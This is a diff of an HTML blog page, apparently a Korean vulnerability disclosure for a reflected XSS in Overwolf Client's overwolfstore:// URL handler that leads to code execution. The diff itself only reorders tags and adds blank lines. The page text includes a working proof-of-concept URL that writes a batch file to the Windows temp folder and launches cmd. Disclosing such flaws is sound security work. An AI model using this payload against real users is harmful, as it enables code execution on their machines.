@@ -244,8 +244,10 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p>
 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf&#xB294; PC &#xAC8C;&#xC784;&#xC744; &#xC704;&#xD55C; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xAC1C;&#xBC1C; &#xD504;&#xB798;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC720;&#xD1B5;&#xD558;&#xB294; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. Overwolf Store&#xC758; URL handler&#xC5D0; Reflected Cross-Site Scripting(XSS)&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs url">overwolfstore://app/apps/&lt;img src=x onerror=alert(document.location)&gt;/4</code></pre>
+
 <p><code>overwolfstore://</code> Custum Scheme&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC6F9;&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xD1B5;&#xD574; OverwolfAppstore.exe &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. URL&#xC758; category&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC624;&#xB958; &#xBA54;&#xC138;&#xC9C0;&#xC758; &#xC77C;&#xBD80;&#xB85C; responce body&#xC5D0; reflect &#xB418;&#xBA70; Overwolf Store UI&#xC758; DOM&#xC5D0; reflect &#xB418;&#xBBC0;&#xB85C; XSS &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs url">overwolfstore://app/apps/&lt;img+src=x+onerror=%22overwolf.io.writeFileContents(&apos;C:\\windows\\temp\\d.bat&apos;,&apos;start%20cmd%20%252fk%20whoami&apos;,&apos;&apos;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&apos;C:\\windows\\temp\\d.bat&apos;)%22&gt;/CCCCCC</code></pre>
+
 <p>&#xC704;&#xB294; PoC &#xCF54;&#xB4DC;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <ol>
 <li>&#xB204;&#xAD70;&#xAC00; &#xC545;&#xC131; URL&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Overwolf Store &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; XSS &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;.</li>
@@ -269,13 +271,13 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
-                  
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
-                  <a class="hover-with-bg" href="/tags/rce/">rce</a>
-                  
                   <a class="hover-with-bg" href="/tags/xss/">xss</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
+                  
+                  <a class="hover-with-bg" href="/tags/rce/">rce</a>
                   
                   <a class="hover-with-bg" href="/tags/sandbox-escape/">sandbox escape</a>
                   
